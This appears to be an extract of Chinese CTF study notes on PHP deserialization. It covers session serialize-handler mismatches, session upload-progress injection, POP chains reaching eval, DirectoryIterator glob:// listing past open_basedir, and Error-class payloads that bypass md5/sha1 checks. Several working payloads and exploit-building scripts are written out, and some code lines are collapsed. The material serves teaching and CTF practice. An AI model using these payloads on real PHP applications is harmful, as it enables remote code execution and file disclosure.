<pre><code>session.save_path=\"D:\\xampp\\tmp\"    \u8868\u660e\u6240\u6709\u7684session\u6587\u4ef6\u90fd\u662f\u5b58\u50a8\u5728xampp/tmp\u4e0bsession.save_handler=files         \u8868\u660esession\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u5b58\u50a8\u7684session.auto_start=0              \u8868\u660e\u9ed8\u8ba4\u4e0d\u542f\u52a8sessionsession.serialize_handler=php     \u8868\u660esession\u7684\u9ed8\u8ba4\u5e8f\u5217\u8bdd\u5f15\u64ce\u4f7f\u7528\u7684\u662fphp\u5e8f\u5217\u8bdd\u5f15\u64ce\nPlain Text\n</code></pre> <p>\u5728\u4e0a\u8ff0\u7684\u914d\u7f6e\u4e2d\uff0c<code>session.serialize_handler</code>\u662f\u7528\u6765\u8bbe\u7f6esession\u7684\u5e8f\u5217\u8bdd\u5f15\u64ce\u7684\uff0c\u9664\u4e86\u9ed8\u8ba4\u7684PHP\u5f15\u64ce\u4e4b\u5916\uff0c\u8fd8\u5b58\u5728\u5176\u4ed6\u5f15\u64ce\uff0c\u4e0d\u540c\u7684\u5f15\u64ce\u6240\u5bf9\u5e94\u7684session\u7684\u5b58\u50a8\u65b9\u5f0f\u4e0d\u76f8\u540c\u3002</p> <p>php_binary:\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684ASCII\u5b57\u7b26+\u952e\u540d+\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c</p> <ul> <li> <p>php:\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u952e\u540d+\u7ad6\u7ebf+\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5904\u7406\u7684\u503c</p> </li> <li> <p>php_serialize(php&gt;5.5.4):\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c</p> </li> <li> <p>\u5728PHP\u4e2d\u9ed8\u8ba4\u4f7f\u7528\u7684\u662fPHP\u5f15\u64ce\uff0c\u5982\u679c\u8981\u4fee\u6539\u4e3a\u5176\u4ed6\u7684\u5f15\u64ce\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4ee3\u7801<code>ini_set('session.serialize_handler', '\u9700\u8981\u8bbe\u7f6e\u7684\u5f15\u64ce');</code></p> </li> </ul> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();// do something\nPlain Text\n</code></pre> <p>php\u4e2d\u7684session\u4e2d\u7684\u5185\u5bb9\u5e76\u4e0d\u662f\u653e\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u800c\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u7684\uff0c\u5b58\u50a8\u65b9\u5f0f\u5c31\u662f\u7531\u914d\u7f6e\u9879<code>session.save_handler</code>\u6765\u8fdb\u884c\u786e\u5b9a\u7684\uff0c\u9ed8\u8ba4\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8\u3002</p> <p>\u5b58\u50a8\u7684\u6587\u4ef6\u662f\u4ee5<code>sess_sessionid</code>\u6765\u8fdb\u884c\u547d\u540d\u7684\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u662fsession\u503c\u7684\u5e8f\u5217\u8bdd\u4e4b\u540e\u7684\u5185\u5bb9\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u7684\u73af\u5883\u662fxampp\uff0c\u90a3\u4e48\u9ed8\u8ba4\u914d\u7f6e\u5982\u4e0a\u6240\u8ff0\u3002</p> <p>\u5728\u9ed8\u8ba4\u914d\u7f6e\u60c5\u51b5\u4e0b\uff1a</p> <pre><code>&lt;?phpsession_start()$_SESSION['name'] = 'spoock';var_dump();?&gt;\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230PHPSESSID\u7684\u503c\u662f<code>jo86ud4jfvu81mbg28sl2s56c2</code>\uff0c\u800c\u5728<code>xampp/tmp</code>\u4e0b\u5b58\u50a8\u7684\u6587\u4ef6\u540d\u662f<code>sess_jo86ud4jfvu81mbg28sl2s56c2</code>\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>name|s:6:\"spoock\";</code>\u3002name\u662f\u952e\u503c\uff0c<code>s:6:\"spoock\";</code>\u662f<code>serialize(\"spoock\")</code>\u7684\u7ed3\u679c\u3002</p> <p>\u5728php_serialize\u5f15\u64ce\u4e0b\uff1a</p> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION['name'] = 'spoock';var_dump();?&gt;\nPlain Text\n</code></pre> <p>SESSION\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>a:1:{s:4:\"name\";s:6:\"spoock\";}</code>\u3002<code>a:1</code>\u662f\u4f7f\u7528php_serialize\u8fdb\u884c\u5e8f\u5217\u8bdd\u90fd\u4f1a\u52a0\u4e0a\u3002\u540c\u65f6\u4f7f\u7528php_serialize\u4f1a\u5c06session\u4e2d\u7684key\u548cvalue\u90fd\u4f1a\u8fdb\u884c\u5e8f\u5217\u5316\u3002</p> <p>\u5728php_binary\u5f15\u64ce\u4e0b\uff1a</p> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION['name'] = 'spoock';var_dump();?&gt;\nPlain Text\n</code></pre> <p>SESSION\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>names:6:\"spoock\";</code>\u3002\u7531\u4e8e<code>name</code>\u7684\u957f\u5ea6\u662f4\uff0c4\u5728ASCII\u8868\u4e2d\u5bf9\u5e94\u7684\u5c31\u662f<code>EOT</code>\u3002\u6839\u636ephp_binary\u7684\u5b58\u50a8\u89c4\u5219\uff0c\u6700\u540e\u5c31\u662f<code>names:6:\"spoock\";</code>\u3002</p> <p>\u4ee5\u4e0a\u4e3a\u9884\u5907\u77e5\u8bc6</p> <p>PHP\u4e2d\u7684Session\u7684\u5b9e\u73b0\u662f\u6ca1\u6709\u7684\u95ee\u9898\uff0c\u5371\u5bb3\u4e3b\u8981\u662f\u7531\u4e8e\u7a0b\u5e8f\u5458\u7684Session\u4f7f\u7528\u4e0d\u5f53\u800c\u5f15\u8d77\u7684\u3002</p> <p>\u5982\u679c\u5728PHP\u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684$_SESSION\u6570\u636e\u65f6\u4f7f\u7528\u7684\u5f15\u64ce\u548c\u5e8f\u5217\u5316\u4f7f\u7528\u7684\u5f15\u64ce\u4e0d\u4e00\u6837\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u7684\u53cd\u5e8f\u5217\u5316\u3002\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6570\u636e\u5305\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u7a0b\u5e8f\u7684\u9a8c\u8bc1\u6216\u8005\u662f\u6267\u884c\u4e00\u4e9b\u7cfb\u7edf\u7684\u65b9\u6cd5\u3002</p> <pre><code>$_SESSION['ryat'] = '|O:11:\"PeopleClass\":0:{}';\nPlain Text\n</code></pre> <p>\u4e0a\u8ff0\u7684$_SESSION\u7684\u6570\u636e\u4f7f\u7528<code>php_serialize</code>\uff0c\u90a3\u4e48\u6700\u540e\u7684\u5b58\u50a8\u7684\u5185\u5bb9\u5c31\u662f<code>a:1:{s:6:\"spoock\";s:24:\"|O:11:\"PeopleClass\":0:{}\";}</code>\u3002</p> <p>\u4f46\u662f\u670d\u52a1\u5668\u5728\u8fdb\u884c\u8bfb\u53d6\u7684\u65f6\u5019\uff0c\u9ed8\u8ba4\u9009\u62e9\u7684\u662f<code>php</code>\uff0c\u90a3\u4e48\u6700\u540e\u8bfb\u53d6\u7684\u5185\u5bb9\u662f:</p> <pre><code>array (size=1)\n  'a:1:{s:6:\"spoock\";s:24:\"' =&gt; \n    object(__PHP_Incomplete_Class)[1]\n      public '__PHP_Incomplete_Class_Name' =&gt; string 'PeopleClass' (length=11)\nPlain Text\n</code></pre> <p>\u8fd9\u662f\u56e0\u4e3a\u5f53\u4f7f\u7528php\u5f15\u64ce\u7684\u65f6\u5019\uff0cphp\u5f15\u64ce\u4f1a\u4ee5|\u4f5c\u4e3a\u4f5c\u4e3akey\u548cvalue\u7684\u5206\u9694\u7b26\uff0c\u90a3\u4e48\u5c31\u4f1a\u5c06<code>a:1:{s:6:\"spoock\";s:24:\"</code>\u4f5c\u4e3aSESSION\u7684key\uff0c\u5c06<code>O:11:\"PeopleClass\":0:{}</code>\u4f5c\u4e3avalue\uff0c\u7136\u540e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6700\u540e\u5c31\u4f1a\u5f97\u5230PeopleClas\u8fd9\u4e2a\u7c7b\u3002\u8fd9\u79cd\u7531\u4e8e\u5e8f\u5217\u8bdd\u5316\u548c\u53cd\u5e8f\u5217\u5316\u6240\u4f7f\u7528\u7684\u4e0d\u4e00\u6837\u7684\u5f15\u64ce\u5c31\u662f\u9020\u6210PHP Session\u5e8f\u5217\u8bdd\u6f0f\u6d1e\u7684\u539f\u56e0\u3002</p> <p>\u4e0b\u9762\u7684\u6458\u81ea\u67d0\u4e2a\u535a\u5ba2\uff1a</p>"},{"location":"web/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#session_start","title":"session_start()","text":"<p>\u9996\u5148\u8bbf\u95ee1.php\uff0c\u5728\u4f20\u5165\u7684\u53c2\u6570\u6700\u5f00\u59cb\u52a0\u4e00\u4e2a'|'\uff0c\u7531\u4e8e1.php\u662f\u4f7f\u7528php_serialize\u5f15\u64ce\u5904\u7406\uff0c\u56e0\u6b64\u53ea\u4f1a\u628a'|'\u5f53\u505a\u4e00\u4e2a\u6b63\u5e38\u7684\u5b57\u7b26\u3002\u7136\u540e\u8bbf\u95ee2.php\uff0c\u7531\u4e8e\u7528\u7684\u662fphp\u5f15\u64ce\uff0c\u56e0\u6b64\u9047\u5230'|'\u65f6\u4f1a\u5c06\u4e4b\u770b\u505a\u952e\u540d\u4e0e\u503c\u7684\u5206\u5272\u7b26\uff0c\u4ece\u800c\u9020\u6210\u4e86\u6b67\u4e49\uff0c\u5bfc\u81f4\u5176\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9'|'\u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002</p> <p>\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a\u5c0f\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9'|'\u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\uff0c\u8fd9\u4e5f\u662f\u5904\u7406\u5668\u7684\u529f\u80fd\uff1f\u8fd9\u4e2a\u5176\u5b9e\u662f\u56e0\u4e3asession_start()\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u4e0b\u5b98\u65b9\u8bf4\u660e\uff1a</p> <p></p> <pre><code>&lt;?php   class student{      var $name;      var $age;   }   $a = new student(); $a-&gt;nage =  \"hacker\";   $a-&gt;age = \"1111\";   echo serialize($a);\nPlain Text\n</code></pre> <p></p> <p>\u653b\u51fb\u601d\u8def\u4e2d\u8bf4\u5230\u4e86\u56e0\u4e3a\u4e0d\u540c\u7684\u5f15\u64ce\u4f1a\u5bf9<code>'|'</code>\uff0c\u4ea7\u751f\u6b67\u4e49\uff0c\u6240\u4ee5\u5728\u4f20\u53c2\u65f6\u5728payload\u524d\u52a0\u4e2a<code>'|'</code>\uff0c\u4f5c\u4e3aa\u53c2\u6570\uff0c\u8bbf\u95ee<code>1.php</code>,\u67e5\u770b\u4e00\u4e0b\u672c\u5730session\u6587\u4ef6\uff0c\u53d1\u73b0payload\u5df2\u7ecf\u5b58\u5165\u5230<code>session</code>\u6587\u4ef6</p> <p></p> <p><code>php_serialize</code>\u5f15\u64ce\u4f20\u5165\u7684payload\u4f5c\u4e3alemon\u5bf9\u5e94\u503c\uff0c\u800c<code>php</code>\u5219\u5b8c\u5168\u4e0d\u4e00\u6837\uff1a</p> <p></p> <p>\u8bbf\u95ee\u4e00\u4e0b2.php</p> <p></p> <p>OVER</p>"},{"location":"web/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#session_upload_process","title":"session_upload_process","text":"<p>\u5728<code>PHP</code>\u4e2d\u8fd8\u5b58\u5728\u4e00\u4e2a<code>upload_process</code>\u673a\u5236\uff0c\u5373\u81ea\u52a8\u5728<code>$_SESSION</code>\u4e2d\u521b\u5efa\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u503c\u4e2d\u521a\u597d\u5b58\u5728\u7528\u6237\u53ef\u63a7\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u4e0b\u5b98\u65b9\u63cf\u8ff0\u7684\uff0c\u8fd9\u4e2a\u529f\u80fd\u5728\u6587\u4ef6\u4e0a\u4f20\u7684\u8fc7\u7a0b\u4e2d\u5229\u7528<code>session</code>\u5b9e\u65f6\u8fd4\u56de\u4e0a\u4f20\u7684\u8fdb\u5ea6\u3002</p> <p></p> <p>\u8fd9\u91cc\u9700\u8981\u5148\u4e0a\u4f20\u6587\u4ef6\uff0c\u540c\u65f6POST\u4e00\u4e2a\u4e0esession.upload_process.name\u7684\u540c\u540d\u53d8\u91cf\u3002\u540e\u7aef\u4f1a\u81ea\u52a8\u5c06POST\u7684\u8fd9\u4e2a\u540c\u540d\u53d8\u91cf\u4f5c\u4e3a\u952e\u8fdb\u884c\u5e8f\u5217\u5316\u7136\u540e\u5b58\u50a8\u5230session\u6587\u4ef6\u4e2d\u3002\u4e0b\u6b21\u8bf7\u6c42\u5c31\u4f1a\u53cd\u5e8f\u5217\u5316session\u6587\u4ef6\uff0c\u4ece\u4e2d\u53d6\u51fa\u8fd9\u4e2a\u952e\u3002\u6240\u4ee5\u653b\u51fb\u70b9\u8fd8\u662f\u8ddf\u4e0a\u4e00\u90e8\u5206\u4e00\u6a21\u4e00\u6837\uff0c\u7a0b\u5e8f\u8fd8\u662f\u4f7f\u7528\u4e86\u4e0d\u540c\u7684session\u5904\u7406\u5f15\u64ce\u3002</p> <p>\u901a\u8fc7<code>POST</code>\u65b9\u6cd5\u6765\u6784\u9020\u6570\u636e\u4f20\u5165<code>$_SESSION</code></p> <pre><code>&lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt;\n    &lt;input type=\"file\" name=\"file\" /&gt;\n    &lt;input type=\"submit\" /&gt;\n&lt;/form&gt;//\u5176\u5b9e\u8fd9\u91cc\u7684\u610f\u601d\u662f\uff0c\u6211\u4eec\u81ea\u5df1\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7f51\u9875\uff0c\u7136\u540e\u5411web\u7aef\u63d0\u4ea4\u6570\u636e\uff0c\u8fd9\u4e2a\u63d0\u4ea4\u540c\u65f6\u5305\u542b\u4e86post\u548cupload\u3002\u7136\u540e\u6211\u4eec\u63d0\u4ea4\u53cd\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u7531\u4e8euplaod_process\u4f1a\u81ea\u52a8\u6dfb\u52a0\u6570\u636e\u5230$_session\u4e2d\uff0c\u800c$_session\u4e2d\u7684\u6570\u636e\u53c8\u4f1a\u81ea\u5df1\u53cd\u5e8f\u5217\u5316\uff08\u7528php\u7684\u65b9\u6cd5\uff09\u6784\u6790\u540e\u5c31\u76f8\u5f53\u4e8eunserilize\u51fd\u6570\u4e86\u3002\nPlain Text\n</code></pre> <p>\u8fd9\u4e2asession\u770b\u4e0d\u61c2\u7684\u8bdd\u5efa\u8bae\u81ea\u5df1\u591a\u591a\u627e\u8d44\u6599\u4e86\u89e3\u4e00\u4e0b\uff0c\u56e0\u4e3a\u786e\u5b9e\u6709\u70b9\u96be\u3002</p>"},{"location":"web/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#_1","title":"\u4e3e\u4f8b\uff08\u4f8b\u9898\uff09","text":"<pre><code>&lt;?php\nhighlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));\n//show_source(__FILE__);\nclass foo1{\npublic $varr;\nfunction __construct(){\n$this-&gt;varr = \"index.php\";\n}\nfunction __destruct(){\nif(file_exists($this-&gt;varr)){\necho \"&lt;br&gt;\u6587\u4ef6\".$this-&gt;varr.\"\u5b58\u5728&lt;br&gt;\";\n}\necho \"&lt;br&gt;\u8fd9\u662ffoo1\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\nclass foo2{\npublic $varr;\npublic $obj;\nfunction __construct(){\n$this-&gt;varr = '1234567890';\n$this-&gt;obj = null;\n}\nfunction __toString(){\n$this-&gt;obj-&gt;execute();\nreturn $this-&gt;varr;\n}\nfunction __desctuct(){\necho \"&lt;br&gt;\u8fd9\u662ffoo2\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\nclass foo3{\npublic $varr;\nfunction execute(){\neval($this-&gt;varr);\n}\nfunction __desctuct(){\necho \"&lt;br&gt;\u8fd9\u662ffoo3\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\n?&gt;\nPlain Text\n</code></pre> <p>index.php</p> <pre><code>&lt;?php\nini_set('session.serialize_handler', 'php');\nrequire(\"./class.php\");\nsession_start();\n$obj = new foo1();\n$obj-&gt;varr = \"phpinfo.php\";\n?&gt;\nPlain Text\n</code></pre> <p>\u901a\u8fc7\u4ee3\u7801\u53d1\u73b0\uff0c\u6211\u4eec\u6700\u7ec8\u662f\u8981\u901a\u8fc7foo3\u4e2d\u7684execute\u6765\u6267\u884c\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u3002</p> <p>\u6784\u9020\uff1a</p> <pre><code>&lt;?php\nclass foo3{\n        public $varr='echo \"spoock\";';\n        function execute(){\n                eval($this-&gt;varr);\n        }\n}\nclass foo2{\n        public $varr;\n        public $obj;\n        function __construct(){\n                $this-&gt;varr = '1234567890';\n                $this-&gt;obj = new foo3();\n        }\n        function __toString(){\n                $this-&gt;obj-&gt;execute();\n                return $this-&gt;varr;\n        }\n}\n\nclass foo1{\n        public $varr;\n        function __construct(){\n                $this-&gt;varr = new foo2();\n        }\n}\n\n\n$obj = new foo1();\nprint_r(serialize($obj));\n?&gt;\n</code></pre> <p>\u5199\u5165\u7684\u65b9\u5f0f\u4e3b\u8981\u662f\u5229\u7528PHP\u4e2dSession Upload Progress\u6765\u8fdb\u884c\u8bbe\u7f6e\uff0c\u5177\u4f53\u4e3a\uff0c\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u5982\u679cPOST\u4e00\u4e2a\u540d\u4e3aPHP_SESSION_UPLOAD_PROGRESS\u7684\u53d8\u91cf\uff0c\u5c31\u53ef\u4ee5\u5c06filename\u7684\u503c\u8d4b\u503c\u5230session\u4e2d</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/DirectoryIterator/","title":"DirectoryIterator","text":"<p>\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u4e8e\u67e5\u770b\u6587\u4ef6\u7cfb\u7edf\u76ee\u5f55\u5185\u5bb9\u7684\u7b80\u5355\u63a5\u53e3\uff0c\u8be5\u7c7b\u662f\u5728 PHP 5 \u4e2d\u589e\u52a0\u7684\u4e00\u4e2a\u7c7b\u3002</p> <p>DirectoryIterator\u4e0eglob://\u534f\u8bae\u7ed3\u5408\u5c06\u65e0\u89c6open_basedir\u5bf9\u76ee\u5f55\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u7528\u6765\u5217\u4e3e\u51fa\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002</p> <pre><code>test.php&lt;?php$dir\u00a0=\u00a0$_GET['whoami'];$a\u00a0=\u00a0new\u00a0DirectoryIterator($dir);foreach($a\u00a0as\u00a0$f)    {\u00a0\u00a0\u00a0\u00a0 echo($f-&gt;__toString().'&lt;br&gt;');}?&gt;\u00a0\u00a0\u00a0\u00a0#\u00a0payload\u4e00\u53e5\u8bdd\u7684\u5f62\u5f0f:$a\u00a0=\u00a0new\u00a0DirectoryIterator(\"glob:///*\");foreach($a\u00a0as\u00a0$f){echo($f-&gt;__toString().'&lt;br&gt;');}?&gt;\nPlain Text\n</code></pre> <p>\u6211\u4eec\u8f93\u5165<code>/?whoami=glob:///*</code>\u5373\u53ef\u5217\u51fa\u6839\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff1a\u4f46\u662f\u4f1a\u53d1\u73b0\u53ea\u80fd\u5217\u6839\u76ee\u5f55\u548copen_basedir\u6307\u5b9a\u7684\u76ee\u5f55\u7684\u6587\u4ef6\uff0c\u4e0d\u80fd\u5217\u51fa\u9664\u524d\u9762\u7684\u76ee\u5f55\u4ee5\u5916\u7684\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\uff0c\u4e14\u4e0d\u80fd\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002</p> <p>\u4f46\u662f\u7ecf\u8fc7\u79ef\u7d2f\uff0c\u8fd8\u662f\u6709\u7c7b\u80fd\u591f\u8bfb\u5230\u6587\u4ef6\uff08\u89c1\u5176\u4ed6\uff09</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/Error_Exception/","title":"ERROR\u7c7b\u548cexception\u7c7b","text":"<p>\u987e\u540d\u601d\u4e49\uff0cerror\u7c7b\u662fphp\u4e2d\u7684\u62a5\u9519\u7c7b</p> <p>exception\u4e3aphp\u4e2d\u7684\u5f02\u5e38\u7c7b\u3002</p> <p>\u56e0\u4e3a\u5b83\u5185\u7f6e\u6709\u4e00\u4e2a<code>__toString()</code>\u7684\u65b9\u6cd5\uff0c\u5e38\u7528\u4e8ePHP \u53cd\u5e8f\u5217\u5316\u4e2d\u3002</p> <p>\u63a5\u4e0b\u6765\u4ecb\u7ecd\u7528\u6cd5\uff08\u6b22\u8fce\u8865\u5145\u59ff\u52bf\uff09</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/Error_Exception/#1-md5sha1","title":"1 .md5()\u548csha1()\u7ed5\u8fc7","text":"<p>md5\u51fd\u6570\u7684\u7ed5\u8fc7\u5e94\u8be5\u5927\u5bb6\u90fd\u6e05\u695a\uff0c\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u662fnull==null\u3002</p> <p>\u4e5f\u5c31\u662f\u4f20\u53c2\u7684\u65f6\u5019\u53d8\u4e3a\u6570\u7ec4\uff0c\u7136\u540e\u4f7fphp\u89e3\u6790\u62a5\u9519</p> <p>\u90a3\u4e48\u8fd9\u91cc\u5176\u5b9e\u539f\u7406\u5f88\u4e3a\u7c7b\u4f3c</p> <p><code>Error</code> \u662f\u6240\u6709PHP\u5185\u90e8\u9519\u8bef\u7c7b\u7684\u57fa\u7c7b\uff0c\u8be5\u7c7b\u662f\u5728PHP 7.0.0 \u4e2d\u5f00\u59cb\u5f15\u5165\u7684\u3002</p> <ul> <li> <p><code>Error::__construct</code>\u2014 \u521d\u59cb\u5316 error \u5bf9\u8c61</p> </li> <li> <p><code>Error::getMessage</code>\u2014 \u83b7\u53d6\u9519\u8bef\u4fe1\u606f</p> </li> <li> <p><code>Error::getPrevious</code>\u2014 \u8fd4\u56de\u5148\u524d\u7684 Throwable</p> </li> <li> <p><code>Error::getCode</code>\u2014 \u83b7\u53d6\u9519\u8bef\u4ee3\u7801</p> </li> <li> <p><code>Error::getFile</code>\u2014 \u83b7\u53d6\u9519\u8bef\u53d1\u751f\u65f6\u7684\u6587\u4ef6</p> </li> <li> <p><code>Error::getLine</code>\u2014 \u83b7\u53d6\u9519\u8bef\u53d1\u751f\u65f6\u7684\u884c\u53f7</p> </li> <li> <p><code>Error::getTrace</code>\u2014 \u83b7\u53d6\u8c03\u7528\u6808\uff08stack trace\uff09</p> </li> <li> <p><code>Error::getTraceAsString</code>\u2014 \u83b7\u53d6\u5b57\u7b26\u4e32\u5f62\u5f0f\u7684\u8c03\u7528\u6808\uff08stack trace\uff09</p> </li> <li> <p><code>Error::__toString</code>\u2014 error \u7684\u5b57\u7b26\u4e32\u8868\u8fbe</p> </li> <li> <p><code>Error::__clone</code>\u2014 \u514b\u9686 error</p> </li> </ul> <p><code>Exception</code> \u662f\u6240\u6709\u5f02\u5e38\u7684\u57fa\u7c7b\uff0c\u8be5\u7c7b\u662f\u5728PHP 5.0.0 \u4e2d\u5f00\u59cb\u5f15\u5165\u7684\u3002</p> <ul> <li> <p><code>Exception::__construct</code>\u2014 \u5f02\u5e38\u6784\u9020\u51fd\u6570</p> </li> <li> <p><code>Exception::getMessage</code>\u2014 \u83b7\u53d6\u5f02\u5e38\u6d88\u606f\u5185\u5bb9</p> </li> <li> <p><code>Exception::getPrevious</code>\u2014 \u8fd4\u56de\u5f02\u5e38\u94fe\u4e2d\u7684\u524d\u4e00\u4e2a\u5f02\u5e38</p> </li> <li> <p><code>Exception::getCode</code>\u2014 \u83b7\u53d6\u5f02\u5e38\u4ee3\u7801</p> </li> <li> <p><code>Exception::getFile</code>\u2014 \u521b\u5efa\u5f02\u5e38\u65f6\u7684\u7a0b\u5e8f\u6587\u4ef6\u540d\u79f0</p> </li> <li> <p><code>Exception::getLine</code>\u2014 \u83b7\u53d6\u521b\u5efa\u7684\u5f02\u5e38\u6240\u5728\u6587\u4ef6\u4e2d\u7684\u884c\u53f7</p> </li> <li> <p><code>Exception::getTrace</code>\u2014 \u83b7\u53d6\u5f02\u5e38\u8ffd\u8e2a\u4fe1\u606f</p> </li> <li> <p><code>Exception::getTraceAsString</code>\u2014 \u83b7\u53d6\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u5f02\u5e38\u8ffd\u8e2a\u4fe1\u606f</p> </li> <li> <p><code>Exception::__toString</code>\u2014 \u5c06\u5f02\u5e38\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32</p> </li> <li> <p><code>Exception::__clone</code>\u2014 \u5f02\u5e38\u514b\u9686</p> </li> </ul> <p>\u4e24\u4e2a\u51fd\u6570\u5747\u6709__tostring\u7c7b</p> <p>\u7a0d\u5fae\u89e3\u91ca\u4e0b\uff1a\uff08\u6697\u793a\u4f8b\u5b50\uff09</p> <pre><code>&lt;?php\nerror_reporting(0);\nclass SYCLOVER \n{        \n    public $syc;    \n    public $lover;       \n    public function __wakeup()      \n    {       \n        if( \n            ($this-&gt;syc != $this-&gt;lover) \n            &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) \n            &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) \n        )      \n        {                          \n            if(!preg_match(\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\", $this-&gt;syc, $match))           \n            {\n                eval($this-&gt;syc);\n            }\n            else \n            {               \n                die(\"Try Hard !!\");           \n            }                   \n        }    \n    }\n}\nif (isset($_GET['great'])) \n{    \n    unserialize($_GET['great']);\n} \nelse \n{    \n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>(\u770b\u5230\u8fd9\u4e2asyclover\u5c31\u60f3\u5230\u90a3\u5f20\u5927\u8138\u3002\u3002\u3002\uff09</p> <p>\u6bd4\u8f83\u5178\u578b\u7684\u53cd\u5e8f\u5217\u5316\u3002</p> <p>\u60f3\u8981\u8fbe\u6210\u4ee3\u7801\u6267\u884c\u5fc5\u987b\u5148\u901a\u8fc7\u4e0a\u9762\u7684md5\u548csha1\u7684\u6bd4\u8f83\u5339\u914d\u3002</p> <p>\u7531\u4e8e\u662f\u56e0\u4e3a\u5728\u7c7b\u4e2d\uff0c\u6570\u7ec4\u662f\u7528\u4e0d\u4e86\u7684\u3002</p> <p>\u60f3\u60f3__tostring\u7684\u8c03\u7528\u65b9\u6cd5\uff1a</p> <p>\u5f53\u7c7b\u88ab\u5f53\u6210\u5b57\u7b26\u4e32\u65f6\u8c03\u7528</p> <p>\u4e8e\u662f\u6211\u4eec\u6784\u9020\u4e00\u6761\u94fe</p> <p>unserilize-&gt;__wakeup()-&gt;error()\u7c7b-&gt;__tostring-&gt;eval()\u51fd\u6570</p> <pre><code>&lt;?php\nclass\u00a0SYCLOVER\u00a0\n{\u00a0\n    public\u00a0$syc;\u00a0\n    public\u00a0$lover;\u00a0$str\u00a0=\u00a0\"?&gt;&lt;?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?&gt;\";\n} \n$a=new\u00a0Error($str,1); \n$b=new\u00a0Error($str,2);//\u539f\u751f\u7c7b\u7528\u5728\u8fd9\u91cc \n$c\u00a0=\u00a0new\u00a0SYCLOVER(); \n$c-&gt;syc\u00a0=\u00a0$a; \n$c-&gt;lover\u00a0=\u00a0$b;\necho(urlencode(serialize($c)));\n?&gt;\n</code></pre> <p>\u8fd9\u5c31\u662f\u6700\u540e\u7684payload</p> 